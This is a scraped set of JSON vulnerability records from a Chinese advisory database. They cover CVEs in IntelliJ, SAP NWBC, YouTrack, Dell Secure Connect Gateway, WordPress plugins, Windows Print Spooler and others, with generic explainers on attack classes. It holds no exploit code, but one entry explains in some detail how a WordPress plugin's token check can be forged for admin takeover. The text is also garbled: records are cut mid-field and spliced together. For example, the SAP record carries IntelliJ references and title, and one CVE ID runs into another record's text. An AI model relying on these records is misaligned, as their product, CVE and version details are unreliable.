""}, {"url": "https://vuldb.com/vuln/399662/cti", "name": ""}, {"url": "https://www.dlink.com/", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "DIR-895L DHCP栈溢出漏洞", "_translated": true, "_saved_at": "2026-09-08T02:35:08+00:00", "_first_saved_at": "2026-09-08T02:35:08+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-xy0d-76ht"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-86502", "cvss": {"cvssv31": [{"source": "cve@jetbrains.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.4}]}, "cvss_score": 8.4, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-306", "description": "JetBrains IntelliJ IDEA 是跨平台 Java/Kotlin IDE，社区版源码公开；其中 IJent 作为远程开发代理，在远程主机上通过 gRPC 提供进程执行与文件系统等能力。\n受影响版本中，经 jetbrainsd 部署到远程开发主机的 IJent gRPC 服务在回环地址以明文、未认证的 HTTP/2 监听。同一主机上的其他本地用户可直接连接该接口并调用完整 IJent API，从而在远程开发主机上执行代码。\n修复版本中通过为远程开发启动路径启用双向 TLS：会话生成证书后以 --use-tls 启动 IJent，并在绑定端口前注入 PEM 证书材料，未持有对应证书的本地调用方无法再驱动 IJent API。", "effects": [{"comp_name": "intellij_idea", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,2026.2.2)", "min_fixed_version": "2026.2.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "关键功能的认证机制缺失", "kind_en": "缺少关键功能的身份验证", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-mhn1-quba", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-mhn1-quba", "name": "https://www.oscs1024.com/hd/MPS-mhn1-quba"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86502", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86502"}, {"url": "https://www.jetbrains.com/privacy-security/issues-fixed/", "name": ""}], "scope_influence": "", "tags": [], "title": "IntelliJ IJent认证缺失漏洞", "_translated": true, "_saved_at": "2026-09-07T23:23:31+00:00", "_first_saved_at": "2026-09-07T20:59:55+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-mhn1-quba"}, {"analysis_status": 0, "articles": [{"content": "- 攻击者通过向受信任的数据序列化过程中添加恶意数据，从而在序列化和反序列化过程中执行恶意代码的攻击漏洞。这种漏洞通常存在于使用序列化 (serialization) 机制存储和传输数据的程序中。\n", "title": "什么是反序列化"}, {"content": "- 注入攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码注入到程序中，从而实现代码执行的目的。\n- 反射攻击：攻击者使用反射机制，在序列化过程中动态生成恶意数据，并将恶意代码注入到程序中，从而实现代码执行的目的。\n- 缓冲区溢出攻击：攻击者通过在序列化过程中向缓冲区输入恶意数据，导致缓冲区溢出，从而破坏程序的内存管理，实现代码执行的目的。\n- 格式字符串攻击：攻击者通过在序列化过程中输入恶意数据，导致程序使用错误的格式字符串，从而实现代码执行的目的。\n- 数据流攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码作为一个数据流传递给程序，从而实现代码执行的目的。\n", "title": "反序列化常见的攻击方式"}, {"content": "- 不信任输入数据：程序应该严格检查输入数据的有效性，并避免使用不受信任的数据。\n- 使用安全的序列化机制：程序应该使用安全的序列化机制，如 JSON 或 XML 序列化，而不是第三方序列化库。\n- 最小特权原则：程序应该限制对受信任数据的处理权限，并避免在运行时修改数据。\n- 代码审查和漏洞扫描：程序应该进行代码审查和漏洞扫描，以发现和修复潜在的安全漏洞。\n", "title": "如何预防反序列化"}], "cnvd_id": "", "cve_id": "CVE-2026-76967", "cvss": {"cvssv31": [{"source": "cna@sap.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-502", "description": "SAP NetWeaver Business Client（NWBC）是 SAP 提供的商业桌面客户端，用于统一访问 SAP 业务应用，并非开源软件。\n受影响版本中，客户端启动时对本地存储数据缺少充分校验。本地低权限攻击者可将该数据替换为构造后的恶意内容，应用程序再次启动时会处理这些内容并进入不安全反序列化路径，从而在当前用户上下文中执行任意代码，对应用机密性、完整性和可用性造成高影响。\n修复版本中通过 SAP Security Note 3784138 提供的安全更新加强对启动阶段本地存储数据的校验，阻止不可信内容进入反序列化执行路径。公开资料未披露更细粒度的源码修改。", "effects": [{"comp_name": "netweaver_business_client", "ecosystem": "linux", "versions": [{"affected_version": "[8.10,8.10]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[8.00,8.00]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "反序列化", "kind_en": "不可信数据的反序列化", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-43jz-bwno", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": //nvd.nist.gov/vuln/detail/CVE-2026-86504", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86504"}, {"url": "https://www.jetbrains.com/privacy-security/issues-fixed/", "name": ""}], "scope_influence": "", "tags": [], "title": "IntelliJ IDEA Dev Container 代码执行漏洞", "_translated": true, "_saved_at": "2026-09-07T23:23:30+00:00", "_first_saved_at": "2026-09-07T20:59:53+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-o9le-746w"}, {"analysis_status": 0, "articles": [{"content": "- 程序中的访问控制机制未正确实现，这种缺陷通常会导致未授权的用户或资源可以访问程序中的重要数据或资源，从而导致程序崩溃或出现其他错误。", "title": "什么是授权检查错误"}, {"content": "- 特权提升攻击：攻击者可以通过利用此缺陷，绕过应用程序的访问控制机制，获取系统管理员权限，从而完全控制系统。\n- 数据泄露攻击：攻击者可以通过利用此缺陷，获取系统中敏感数据，如用户凭证、信用卡信息等。\n- 拒绝服务攻击：攻击者可以通过利用此缺陷，对系统进行拒绝服务攻击，从而使系统无法正常工作。\n- 恶意软件传播：攻击者可以通过利用此缺陷，将恶意软件传播到系统中，从而控制系统或窃取敏感数据。\n", "title": "授权检查错误常见的攻击方式"}, {"content": "- 使用访问控制列表 (ACL):使用 ACL 可以限制用户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "cnvd_id": "", "cve_id": "CVE-2026-86498", "cvss": {"cvssv31": [{"source": "cve@jetbrains.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N", "severity": "high", "base_score": 7.7}]}, "cvss_score": 7.7, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N", "cwe": "CWE-863", "description": "JetBrains YouTrack 是商业问题跟踪与项目管理软件，提供缺陷跟踪、知识库、敏捷协作和 REST API，源码不公开。\n受影响版本中，链接子资源的 PUT 请求未校验目标实体的更新权限，已认证用户在缺少更新权限时仍可修改被链接实体，造成跨权限边界的数据被改写。\n修复版本中通过补齐链接子资源 PUT 请求的更新权限检查，阻止无更新权限的用户修改被链接实体。", "effects": [{"comp_name": "youtrack", "ecosystem": "linux", "versions": [{"affected_version": "[2026.1,2026.1.14047)", "min_fixed_version": "2026.1.14047", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(-∞,2025.3.160480)", "min_fixed_version": "2025.3.160480", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-drxs-4zli", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-drxs-4zli", "name": "https://www.oscs1024.com/hd/MPS-drxs-4zli"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86498", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86498"}, {"url": "https://www.jetbrains.com/privacy-security/issues-fixed/", "name": ""}], "scope_influence": "", "tags": [], "title": "YouTrack链接越权漏洞", "_translated": true, "_saved_at": "2026-09-07T20:59:52+00:00", "_first_saved_at": "2026-09-07T20:59:52+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-drxs-4zli"}, {"analysis_status": 0, "articles": [{"content": "- 程序中未正确实现授权机制，从而导致程序可以被未授权的用户访问或篡改", "title": "什么是授权检查缺失"}, {"content": "- 伪造授权请求：攻击者可以通过发送伪造的授权请求来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过伪造用户名和密码、证书等来模拟授权请求，从而绕过授权验证。\n- 命令注入攻击：攻击者可以通过在应用程序中注入恶意的命令来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中注入恶意的命令来访问受保护的数据库或文件系统。\n- 文件包含攻击：攻击者可以通过在应用程序中包含恶意的文件，从而利用 Missing Authorization 漏洞来访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中包含恶意的 CSS 或 JavaScript 文件来欺骗应用程序将用户输入的数据执行为授权请求，从而绕过授权验证。\n- 拒绝服务攻击 (DDoS):攻击者可以通过向应用程序发送大量的请求来占用其资源，从而实现拒绝服务攻击。例如，攻击者可以通过向 Web 服务器发送大量的 HTTP 请求来占用其资源，从而使 Web 服务器无法正常响应合法的请求。\n", "title": "授权检查缺失常见的攻击方式"}, {"content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查缺失"}], "cnvd_id": "", "cve_id": "CVE-2026 面对敌对服务端时同样会增长。\n修复版本中通过在 stream_state 进入 CLOSED 时把 stream_id 记入 closed_streams，并在数量超过 max_closed_streams（默认 65535）时删除最旧的已关闭流表项，切断流表无限增长。", "effects": [{"comp_name": "Protocol-HTTP2", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.14)", "min_fixed_version": "1.14", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "内存泄漏", "kind_en": "有效生命周期后内存丢失释放", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-zm6k-47ln", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-zm6k-47ln", "name": "https://www.oscs1024.com/hd/MPS-zm6k-47ln"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-16028", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-16028"}, {"url": "https://github.com/vlet/p5-Protocol-HTTP2/commit/27a488a34d74fd16f123e5e6186d4f677faa246f.patch", "name": ""}, {"url": "https://metacpan.org/release/CRUX/Protocol-HTTP2-1.13/source/lib/Protocol/HTTP2/Stream.pm#L113-126", "name": ""}, {"url": "https://metacpan.org/release/CRUX/Protocol-HTTP2-1.14/changes", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Protocol::HTTP2内存耗尽漏洞", "_translated": true, "_saved_at": "2026-09-07T23:23:29+00:00", "_first_saved_at": "2026-09-07T20:59:51+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-zm6k-47ln"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-79691", "cvss": {"cvssv31": [{"source": "security_alert@emc.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "severity": "high", "base_score": 7.3}]}, "cvss_score": 7.3, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "cwe": "CWE-295", "description": "Dell Secure Connect Gateway（SCG）是戴尔闭源远程支持网关，用于在客户环境与戴尔支持服务之间建立安全连接，并提供设备监控与远程协助能力，分为 Application 与 Appliance 两种部署形态。\n受影响版本中，产品存在不正确的证书校验缺陷。未认证攻击者在具备远 提供 Application 与 Appliance 两种形态，源码不公开。\n受影响版本中，产品存在错误运算符使用问题。未认证的远程攻击者可利用该逻辑缺陷获得未授权访问。厂商与 NVD 均未披露具体出错的运算符、代码位置或对外接口。\n修复版本中通过官方安全更新修正该运算符使用问题，阻断未认证远程访问通向未授权访问的路径。Application 形态修复版本为 5.36.00.00，Appliance 形态修复版本为 5.36.00.16。", "effects": [{"comp_name": "Secure Connect Gateway 5.0 - Appliance", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,5.36.00.16)", "min_fixed_version": "5.36.00.16", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "Secure Connect Gateway 5.0 - Application", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,5.36.00.00)", "min_fixed_version": "5.36.00.00", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "使用操作符不正确", "kind_en": "使用不正确的操作符", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-x126-jobp", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-x126-jobp", "name": "https://www.oscs1024.com/hd/MPS-x126-jobp"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-79643", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-79643"}, {"url": "https://www.dell.com/support/kbdoc/en-in/000503426/dsa-2026-382-security-update-for-dell-secure-connect-gateway-virtual-edition-multiple-vulnerabilities?msockid=3021cac2195069ed3194ddad186a68f9", "name": ""}], "scope_influence": "", "tags": [], "title": "Dell SCG错误运算符漏洞", "_translated": true, "_saved_at": "2026-09-07T17:02:51+00:00", "_first_saved_at": "2026-09-07T17:02:51+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-x126-jobp"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能正确验证和过滤用户输入，将用户提供的数据直接用作操作系统命令的一部分。攻击者可以利用这个漏洞，通过注入恶意的操作系统命令来执行任意系统命令、获取敏感信息或者对系统进行未授权的操作。", "title": "什么是OS命令注入"}, {"content": "- 命令拼接：应用程序将用户输入直接拼接到操作系统命令中，而不进行合适的过滤和验证。攻击者可以通过在输入中注入特殊字符、命令分隔符等，来执行额外的命令或修改原始命令的行为。\r\n- 命令注释：攻击者通过在输入中注入特殊字符或命令注释符号，如\"#\"或\"//\"，来注释掉原始命令中的一部分，然后执行自己的恶意命令。\r\n- 命令管道：攻击者通过在输入中注入管道符号\"|\"，将多个命令连接起来执行。这使得攻击者可以在单个注入点上执行多个命令，进一步扩大攻击的范围。", "title": "OS命令注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对用户输入进行严格的验证和过滤，确保只接受预期的有效输入。可以使用白名单验证，限制用户输入的字符集和格式，防止特殊字符和命令注释符的注入。\r\n- 使用参数化命令或预编译语句：应该使用参数化命令或预编译语句，而不是将用户输入直接拼接到命令中。这样可以将输入数据视为参数，而不是命令的一部分，从而避免命令注入漏洞。\r\n- 最小特权原则：应用程序在执行操作系统命令时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。这样即使发生命令注入漏洞，攻击者的权限也会受到限制。\r\n- 安全编码实践：开发人员应避免使用不受信任的用户输入来拼接命令，并使用安全的编码实践，如输入验证、输出编码和参数化查询等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止命令注入攻击。", "title": "如何预防OS命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-80127", "cvss": {"cvssv31": [{"source": "security_alert@emc.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-78", "description": "Dell Secure Connect Gateway 是戴尔提供的企业监控与支持网关产品，以 Application 应用版和 Appliance 虚拟设备两种形态交付，用于监测戴尔服务器、存储和网络设备并采集故障遥测，源码未公开。\n受影响版本中，产品对操作系统命令所用特殊元素过滤不完整，已具备高权限且可远程访问的攻击者可将恶意内容注入操作系统命令并提升权限。\n修复版本中通过官方安全更新收紧命令参数处理，切断该命令注入路径；Application 升级至 5.36.00.00 及以上，Appliance 升级至 5.36.00.16 及以上。", "effects": [{"comp_name": "secure_connect_gateway", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,5.36.00.00)", "min_fixed_version": "5.36.00.00", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(-∞,5.36.00.16)", "min_fixed_version": "5.36.00.16", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "OS命令注入", "kind_en": "操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-xlnp-d0zk", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-xlnp-d0zk", "name": "https://www.oscs1024.com/hd/MPS-xlnp-d0zk"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-80127", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-80127"}, {"url": "https://www.dell.com/support/kbdoc/en-in/000503426/dsa-2026-382-security-update-for-dell-secure-connect-gateway-virtual-edition-multiple-vulnerabilities?msockid=3021cac2195069ed3194ddad186a68f9", "name": ""}], "scope_influence": "", "tags": [], "title": "Dell SCG命令注入漏洞", "_translated": true, "_saved_at": "2026-09-07T17:02:48+00:00", "_first_saved_at": "2026-09-07T17:02:48+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-xlnp-d0zk"}, {"analysis_status": 0, "articles": [{"content": "- 程序中未正确实现授权机制，从而导致程序可以被未授权的用户访问或篡改", "title": "什么是授权检查缺失"}, {"content": "- 伪造授权请求：攻击者可以通过发送伪造的授权请求来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过伪造用户名和密码、证书等来模拟授权请求，从而绕过授权验证。\n- 命令注入攻击：攻击者可以通过在应用程序中注入恶意的命令来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中注入恶意的命令来访问受保护的数据库或文件系统。\n- 文件包含攻击：攻击者可以通过在应用程序中包含恶意的文件，从而利用 Missing Authorization 漏洞来访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中包含恶意的 CSS 或 JavaScript 文件来欺骗应用程序将用户输入的数据执行为授权请求，从而绕过授权验证。\n- 拒绝服务攻击 (DDoS):攻击者可以通过向应用程序发送大量的请求来占用其资源，从而实现拒绝服务攻击。例如，攻击者可以通过向 Web 服务器发送大量的 HTTP 请求来占用其资源，从而使 Web 服务器无法正常响应合法的请求。\n", "title": "授权检查缺失常见的攻击方式"}, {"content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查缺失"}], "cnvd_id": "", "cve_id": "CVE-2026-9331", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L", "cwe": "CWE-862", "description": "EDD Product Catalog Feed by PixelYourSite 是 PixelYourSite 出品的 WordPress 商业插件，用于从 Easy Digital Downloads 商店生成 Facebook Product Catalog 与 Google Merchant Center 所需的产品 XML Feed。 不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-80099", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-287", "description": "多个 Newfold 插件容易遭到身份验证绕过。该漏洞的存在是因为插件捆绑了 wp-module-data 模块。在该模块中，“authenticate()”方法（在“rest_authentication_errors”过滤器上注册，因此对每个未经身份验证的 REST API 请求进行评估）执行 HMAC 风格的 Bearer 令牌比较，当“HiiveConnection::get_auth_token()”返回“false”时，该比较会退化：PHP 将“strrev(false)”强制为“strrev('')”，将秘密盐折叠为公开的盐常量 `hash('sha256', '') = e3b0c44...`，而所有剩余的哈希输入（HTTP 方法、请求 URL、原始请求正文和 `X-Timestamp` 标头）仍然完全由攻击者控制。这使得未经身份验证的攻击者可以完全离线计算有效的 Bearer 令牌，通过令牌相等性检查，并对 get_users(['role' =\u003e 'administrator'])` 返回的第一个管理员调用 `wp_set_current_user()`，授予完全管理员级别的访问权限并启用任意 REST API 操作，例如创建新的管理员帐户和实现完全站点接管。易受攻击的版本为WP Plugin Crazy Domains (\u003c= 2.5.2)、WP Plugin Web (\u003c= 2.3.4)、WP Plugin Hostgator (\u003c= 3.1.0)、WP Plugin Bluehost (\u003c= 4.17.1)。受影响的模块在 2.9.4 及以下版本中容易受到攻击。", "effects": [{"comp_name": "WP Module Data", "ecosystem": "linux", "versions": [{"affected_version": "(0,2.9.7]", "min_fix :H/A:H", "cwe": "CWE-122", "description": "Windows Print Spooler 组件中基于堆的缓冲区溢出允许未经授权的攻击者通过网络执行代码。", "effects": [{"comp_name": "windows_11_24H2", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.26100.0,10.0.26100.9445)", "min_fixed_version": "10.0.26100.9445", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "堆缓冲区溢出", "kind_en": "基于堆的缓冲区溢出", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-ub52-v610", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-ub52-v610", "name": "https://www.oscs1024.com/hd/MPS-ub52-v610"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85877", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-85877"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-85877", "name": "Windows Print Spooler Remote Code Execution Vulnerability"}], "scope_influence": "", "tags": ["操作系统"], "title": "Windows打印后台处理程序远程代码执行漏洞", "_translated": true, "_saved_at": "2026-09-08T19:47:18+00:00", "_first_saved_at": "2026-09-08T19:47:18+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ub52-v610"}, {"analysis_status": 0, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等。", "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-86775", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L", "severity": "high", "base_score": 8.6}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-22", "description": "known（npm 包）版本 \u003c= 0.29.1 包含文档 API 中的路径遍历漏洞。 Internal/server/routes/docs.go 中的 HTTP 处理程序使用 cleanDocPath() 规范化用户提供的文档路径，该路径会去除前导/尾随斜杠和 .md 后缀，但不会中和 ../ 